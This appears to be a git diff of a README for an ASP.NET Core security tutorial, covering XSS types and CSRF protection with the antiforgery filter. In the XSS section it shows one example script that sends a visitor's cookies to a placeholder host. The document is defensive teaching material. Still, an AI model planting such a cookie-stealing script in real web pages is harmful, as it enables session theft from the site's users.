@@ -125,7 +125,7 @@ Also we can define more specific rules. I tried explain in project file. You can
 # Attacks
 ## XSS
 This is a kind of script vulnerability. Done by integrate harmful script in our HTML and JS files. There are 3 ways. But we can apply same solution all of them. Net Core provide solution as default. Again thanks great dot net. Not need to define in `Startup.cs` file. if we want we can disable it.
-```
+```html
 <script> new Image().\"http://example.com/readCookie/?account=\"+document.cookie\"</script>
 ```
 as example, when this script integrated to our js codes it's send to own "domain". that's very simple process but so effective. XSS attacks are one of the most common forms of Web Attacks, and this type of attack accounts for 12.75% of all web attacks.
@@ -136,10 +136,18 @@ Hacker is integrate scripts to source code in server side. it's so dangerous. Ha
 ### Dom(Document Object Model)
 This way genrally weld up from trying to payload after # sign.
 ## CSRF(Cross Site Request Forgery)
+<div align="center">
 <a href="https://github.com/ikbalkazanc">
-    <img src="https://github.com/ikbalkazanc/Asp.NetCore-Security/blob/master/cross_site_request_forger_1.png.jpg" alt="Logo" width="50%" height="50%" ">
-  </a>
-
+    <img src="https://github.com/ikbalkazanc/Asp.NetCore-Security/blob/master/cross_site_request_forger_1.png.jpg" alt="Logo" width="80%" height="80%" ">
+</a></di>
+Actually picture explain everything. in sum, hacker is creating new request with using fake url. in meantime he's stealing datas inside of request.</br>
+Solution of this problem is simple too with Asp.Net Core. We're will using application level filter. First of all we're adding service in `Startup.cs` file.
+```csharp
+services.AddControllersWithViews(opt =>
+{
+  opt.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());
+});
+```
 <!-- CONTACT -->
 ## Contact
 Muhammet İkbal KAZANCI - [LinkedIn](https://www.linkedin.com/in/ikbalkazanc/) - mi.kazanci@hotmail.com
